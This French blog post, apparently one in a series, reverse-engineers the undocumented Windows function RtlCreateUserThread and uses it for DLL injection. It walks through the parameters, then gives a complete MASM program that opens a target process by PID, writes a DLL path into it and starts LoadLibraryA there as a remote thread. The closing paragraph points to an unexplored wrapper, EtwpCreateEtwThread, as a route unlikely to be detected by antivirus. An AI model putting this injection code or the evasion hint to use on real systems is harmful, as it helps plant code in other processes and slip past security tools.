
Cet article va me permettre de présenter une autre manière d'injecter une DLL dans un processus. Il fait suite aux 2 précédents:

* https://dokyx.fr/blog/oirtslkdf_injectdll_createremotethread/

* https://dokyx.fr/blog/uyniouliu_injectdll_ntcreatethreadex/

Ici, je vais utiliser la fonction __RtlCreateUserThread()__ qui se trouve dans __ntdll.dll__ afin de créer le thread qui sera injecté dans le processus cible et qui chargera en mémoire la DLL. Une fois chargée en mémoire, le code placé à l'entry point de la DLL sera exécuté.

Je me permet de rappeler que la fonction __CreateRemoteThread()__ utilise la fonction native __NtCreateThreadEx()__ afin de créer un thread dans un processus cible. Ainsi, il est possible de les utiliser pour faire de l'injection de DLL. En regardant de plus près la DLL __ntdll.dll__, on s'aperçoit que la fonction __NtCreateThreadEx()__ est appelée par une autre fonction (__RtlCreateUserThreadEx()__) qui elle-même est appelée par __RtlCreateUserThread()__.

Cette méthode d'injection de DLL par le biais de __RtlCreateUserThread__ est bien connue et est d'ailleurs utilisée par metasploit (https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/common/arch/win/remote_thread.c). On commence à sentir, au travers des différentes méthodes d'injection de DLL présentées jusqu'ici, qu'on touche du doigt les méthodes réellement utilisées par les pentesters (qui d'ailleurs ne connaissent pas toujours les fondamentaux des outils qu'ils utilisent).

Revenons à nos moutons. __RtlCreateUserThread()__ est une fonction utilisée par Windows, mais qui n'est pas documentée dans la msdn. En revanche, on peut tenter d'user de reverse engineering afin d'en saisir le fonctionnement et ainsi pouvoir l'utiliser correctement. Si l'on prend le temps de regarder la fonction __EtwpCreateEtwThread()__ et qui fait directement appel à __RtlCreateUserThread()__, on peut y déterminer le nombre de paramètres comme on peut le voir ci-dessous:

![image alt text](/images/dll-injection/rtlcreateuserthread_arg.png)

On voit rapidement que la fonction __RtlCreateUserThread()__ prend 10 paramètres. Je rappelle que la convention d'appels x64 est de mettre les 4 premiers paramètres dans les registres rcx, rdx, r8, r9 (dans cet ordre), puis les autres sur la stack. Ici, on ne pousse pas directement sur la stack. On peut voir l'instruction __mov r11, rsp__ en début de fonction qui permet de mettre l'adresse du pointeur de stack dans le registre r11. Ainsi tout ce qui fera référence à ce registre fera référence à la stack. On peut alors soit compter le nombre d'instruction qui positionne "quelque chose" à cette adresse+offset, et ajouter 4 (rcx, rdx, r8, r9), ce qui donnera le nombre de paramètres; ou bien, comprendre que l'instruction __sub rsp, 0x50__ permet de faire de la place sur la stack pour stocker les paramètres (0x50 = 80d -> 10 paramètres car 80/8 = 10).

Commençons par les paramètres les plus simples à déterminer. Le premier (celui qui est contenu dans rcx) est "probablement" un handle vers le processus dans lequel on veut créer le thread. Ce n'est qu'une supposition, mais c'est souvent comme ça que ça se passe.

Le second paramètre (rdx) est défini grâce à l'instruction __xor edx, edx__, ce qui revient à mettre le registre edx à 0.

Le troisième paramètre (r8) est défini grâce à l'instruction __mov r8b, 1__, ce qui permet de mettre r8b à 1.

Le quatrième  paramètre (r9) est défini grâce à l'instruction __xor r9d, r9d__, ce qui permet de mettre r9d à 0.

Le cinquième paramètre est poussé sur la stack grâce à l'instruction  __and qword [r11-0x38], 0__, ce qui permet de mettre le contenu situé à r11-0x38 à 0. En effet, la table de vérité du __AND__ (https://en.wikipedia.org/wiki/Truth_table) spécifie que: 

```
0 and 0 = 0
0 and 1 = 0
1 and 0 = 0
1 and 1 = 1
```

Le sizième paramètre est poussé sur la stack grâce à l'instruction __and qword [r11-0x30], 0__. Même réflexion que pour le cinquième paramètre.

Le dizième paramètre est poussé sur la stack grâce à l'instruction __and qword [r11-0x10], 0__. Même réflexion que pour le cinquième/sizième paramètre.

Les autres paramètres sont un peu plus difficile à estimer ... (septième: __mov [r11-0x28], rcx__, huitième: __mov [r11-0x20]__, rdx, neuvième: __mov [r11-0x18], rax__). Pour ceux qui ont lu l'article sur l'injection de DLL via CreateRemoteThread (https://dokyx.fr/blog/oirtslkdf_injectdll_createremotethread/), on se souvient que pour utiliser cette fonction il faut passer en paramètre le handle vers l'adresse de la fonction de __LoadLibrary()__, mais aussi l'adresse de base à laquelle une zone mémoire a été allouée dans le processus cible. On peut alors se douter que ces paramètres seront aussi présent ici. La question est: lesquels?

Ici, je vous avoue que j'ai commencé à coincer. L'idéal aurait été de coder un bout de code avec des fonctions documentées qui utilise __RtlCreateUserThread()__, mais je n'en connaissais pas. 

Cependant, j'ai pu m'en sortir grâce à l'excellent travail qui a été fait sur __reactos__ (https://doxygen.reactos.org/da/d0c/sdk_2lib_2rtl_2thread_8c.html#ae5f514e4fcb7d47880171175e88aa205). On y voit que le prototype de __RtlCreateUserThread()__ est:

```
RtlCreateUserThread( 
	IN HANDLE 					ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor 	OPTIONAL,
	IN BOOLEAN 					CreateSuspended,
	IN ULONG StackZeroBits 				OPTIONAL,
	IN SIZE_T StackReserve 				OPTIONAL,
	IN SIZE_T StackCommit 				OPTIONAL,
	IN PTHREAD_START_ROUTINE 			StartAddress,
	IN PVOID Parameter 				OPTIONAL,
	OUT PHANDLE ThreadHandle 			OPTIONAL,
	OUT PCLIENT_ID ClientId 			OPTIONAL 
)	
```

On vérifie alors que le premier paramètre est bien un handle vers le processus cible dans lequel on souhaite s'injecter. De plus, on constate que le septième paramètre contiendra le handle vers l'adresse de __LoadLibrary()__. Le neuvième paramètre est un buffer qui contiendra le handle du thread qui a été crée; et donc ce paramètre doit contenir le pointeur vers ce buffer. Et on estime alors que le huitième paramètre contient l'adresse de base de la zone mémoire allouée dans le processus cible.

Un dernier constat, qui peut avoir son intérêt, est le troisième paramètre qui indique "CreateSuspended" signifiant probablement que le thread est crée dans un état suspendu lorsqu'il est mis à 1. On peut alors estimer qu'une autre valeur permet de le créer en état non suspendue (0 ? oui !). Ou bien on devra utiliser la fonction __NtResumeThread()__ comme cela est fait dans le code de __ntdll.dll__ et comme on peut le voir ci-dessous:

![image alt text](/images/dll-injection/rtlcreateuserthread_suspended.png)

En résumé, la fonction __RtlCreateUserThread()__ devra s'utiliser comme:

```
.data?
	hCreateThread	dd ?
.code
	push 	0
	push 	offset hCreateThread
	push 	bassAddr
	push 	hLoadLibAddr
	push 	0
	push 	0
	push 	0
	push 	1 ; CreateSuspended
	push 	0
	push 	hProcess
	call 	RtlCreateUserThread
```

Bien évidemment je ne peux pas appeller __RtlCreateUserThread()__ comme ça, car cette fonction est dans __ntdll.dll__. Mais je peux trouver son adresse grâce à la fonction __GetProcAddress()__ (comme dans https://dokyx.fr/blog/uyniouliu_injectdll_ntcreatethreadex/). Ainsi:

```
.data
	sNtdll			db "ntdll.dll", 0
	sRtlCreateUserThread 	db "RtlCreateUserThread", 0

.data?
	hCreateThread		dd ?
	hNtdllAddr		dd ?
	hRtlCreateUserThreadAddr dd ?

.code

_getModuleHandle_ntdll:
	push 	offset sNtdll
	call 	GetModuleHandleA
	cmp 	eax, 0
	jz	_exit
	mov 	[hNtdllAddr], eax

_getProcAddress_RtlCreateUserThread:
	push 	offset sRtlCreateUserThread
	push	hNtdllAddr
	call 	GetProcAddress
	cmp 	eax, 0
	jz  	_exit
	mov 	[hRtlCreateUserThreadAddr], eax

_RtlCreateUserThread:
	push 	0
	push 	offset hCreateThread
	mov	eax, [baseAddr]
	push 	eax
	mov 	eax, [hLoadlibAddr]
	push 	eax	
	push 	0
	push 	0
	push 	0
	push 	0 ; CreateSuspended: 1
	push 	0
	mov 	eax, [hProcess]
	push 	eax
	
	mov 	eax, [hRtlCreateUserThreadAddr]
	call 	eax
```

Et pour finir, vous trouverez ci-dessous le code permettant d'effectuer de l'injection de DLL via __RtlCreateUserThread()__.

<details><summary><font color="red">Ici se trouve le code permettant de faire de l'injection de DLL via RtlCreateUserThread()</font></summary>
<p>
```
.586
.model flat, stdcall


; kernel32.dll
GetLastError PROTO STDCALL
ExitProcess PROTO STDCALL :DWORD
OpenProcess PROTO STDCALL :DWORD,:DWORD,:DWORD
VirtualAllocEx PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
WriteProcessMemory PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
GetModuleHandleA PROTO STDCALL :DWORD
GetProcAddress PROTO STDCALL :DWORD,:DWORD


.data
	dllPath 	db "C:\Users\User 1\Desktop\inject.dll",0
	sKrnl32 	db "kernel32.dll",0
	sLoadLib	db "LoadLibraryA",0
	sNtdll		db "ntdll.dll", 0
	sRtlCreateUserThread 	db "RtlCreateUserThread", 0
	PID 		dd 5376
	
.data?
    	hProcess 	dd ?
 	nSizeDLL 	dd ?
 	baseAddr	dd ?
 	hKrnl32Addr 	dd ?
 	hLoadLibAddr 	dd ?

	hRtlCreateUserThreadAddr dd ?
 	hCreateThread 	dd ?
 	hNtdllAddr 	dd ?

.code

Start PROC

_openProcess:
	mov 	eax, PID
	push 	eax
	push 	0
	push 	1F0FFFh ; PROCESS_ALL_ACCESS
	call 	OpenProcess
	cmp 	eax, 0
	jz 	_exit
	mov 	[hProcess], eax

	
_virtualAllocEx:
	push 	40h ; PAGE_EXECUTE_READWRITE
	push 	3000h ; MEM_RESERVE or MEM_COMMIT
	push 	sizeof dllPath
	push  	0
	push 	hProcess
	call 	VirtualAllocEx
	cmp 	eax, 0
	jz 	_exit
	mov 	[baseAddr], eax

_writeProcessMemory:
	push 	0
	push  	sizeof dllPath
	push 	offset dllPath
	push 	baseAddr
	push 	hProcess
	call 	WriteProcessMemory
	cmp 	eax, 0
	jz 	_exit

_getModuleHandle:
	push 	offset sKrnl32
	call 	GetModuleHandleA
	cmp 	eax, 0
	jz	_exit
	mov 	[hKrnl32Addr], eax

_getProcAddress:
	push 	offset sLoadLib
	push	hKrnl32Addr
	call 	GetProcAddress
	cmp 	eax, 0
	jz  	_exit
	mov 	[hLoadLibAddr], eax

_getModuleHandle_ntdll:
	push 	offset sNtdll
	call 	GetModuleHandleA
	cmp 	eax, 0
	jz	_exit
	mov 	[hNtdllAddr], eax

_getProcAddress_RtlCreateUserThread:
	push 	offset sRtlCreateUserThread
	push	hNtdllAddr
	call 	GetProcAddress
	cmp 	eax, 0
	jz  	_exit
	mov 	[hRtlCreateUserThreadAddr], eax

_RtlCreateUserThread:
	push 	0
	push 	offset hCreateThread
	mov	eax, [baseAddr]
	push 	eax
	mov 	eax, [hLoadlibAddr]
	push 	eax	
	push 	0
	push 	0
	push 	0
	push 	0 ; CreateSuspended: 1
	push 	0
	mov 	eax, [hProcess]
	push 	eax
	
	mov 	eax, [hRtlCreateUserThreadAddr]
	call 	eax

_exit:
	xor     eax, eax
	push 	eax
	call 	ExitProcess

Start ENDP
END
```
</p>
</details>

On voit que l'on touche du doigt les méthodes modernes d'injection de DLL, en tout cas celles utilisées dans metasploit.

Je n'ai pas encore porté tout ça sur du x64 par flemme, mais promis, je reprendrais toutes les méthodes d'injection de DLL que j'ai présenté et je les porterais sur x64 à l'occasion.

On a pu également voir que la fonction __RtlCreateUserThread()__ était une sorte de "wrapper" de __NtCreateThreadEx()__. Mais ce que je n'ai pas souligné plus haut est que __EtwpCreateEtwThread()__ est également une sorte de "wrapper" pour __RtlCreateUserThread()__. Il serait donc possible d'effectuer de l'injection de DLL avec cette fonction ... Je n'ai trouvé aucune trace de cette méthode sur Internet ^^, il y a donc peu de chance qu'elle soit détectée par les antivirus, si vous voyez ce que je veux dire ...

Il suffit de "reverser" la fonction __EtwpCreateEtwThread()__, pour mettre au point une nouvelle méthode d'injectiond de DLL, mais aussi pour contribuer à __reactos__ car cette fonction n'a pas encore été "reversée". G00d LucK with that !


